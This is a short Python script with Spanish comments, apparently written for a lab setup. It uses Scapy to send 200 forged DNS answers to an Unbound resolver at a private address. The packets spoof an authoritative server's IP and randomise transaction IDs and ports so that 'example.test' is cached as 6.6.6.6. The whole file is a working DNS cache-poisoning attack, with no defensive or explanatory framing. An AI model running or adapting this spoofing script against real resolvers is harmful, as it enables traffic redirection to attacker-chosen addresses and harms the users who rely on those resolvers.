from scapy.all import *
import random
import time

target_ip = "172.20.0.3"  # IP del no dnsdist, si Unbound
fake_ip = "1.2.3.4"  # Suplantación del servidor autoritativo

for i in range(200):  # 200 intentos rápidos, no es flooding
    pkt = IP(src=fake_ip, dst=target_ip) / \
          UDP(sport=53, dport=random.randint(1024, 65535)) / \
          DNS(
              id=random.randint(0, 65535),
              qr=1, aa=1, rd=0, ra=0,
              qd=DNSQR(qname="example.test", qtype="A"),
              an=DNSRR(rrname="example.test", ttl=600, rdata="6.6.6.6")
          )
    send(pkt, verbose=0)
    time.sleep(0.005)  # espera mínima para no saturar
